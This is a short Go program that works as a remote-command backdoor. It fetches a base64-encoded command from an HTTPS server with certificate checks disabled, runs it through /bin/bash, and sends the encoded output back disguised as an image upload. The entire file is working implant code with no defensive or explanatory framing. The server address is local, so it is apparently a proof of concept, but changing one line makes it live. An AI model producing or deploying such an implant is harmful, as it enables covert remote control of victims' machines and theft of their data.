package main

import (
	"bytes"
	"io/ioutil"
	"log"
	"net/http"
	"os/exec"
	"encoding/base64"
	"crypto/tls"
)

func main() {
	uri := "https://127.0.0.1:8888/"

	conn := &http.Transport {
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cli := &http.Client{Transport: conn}
	
	resp, err := cli.Get(uri)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	dec_cmd, err := base64.StdEncoding.DecodeString(string(body))

	cmd := exec.Command("/bin/bash", "-c", string(dec_cmd))
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Fatal(err)
	}
	if err := cmd.Start(); err != nil {
		log.Fatal(err)
	}

	buf := new(bytes.Buffer)
	buf.ReadFrom(stdout)
	enc_out := base64.StdEncoding.EncodeToString(buf.Bytes())

	resp, err = cli.Post(uri, "image/jpeg", bytes.NewBufferString(enc_out))
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
}
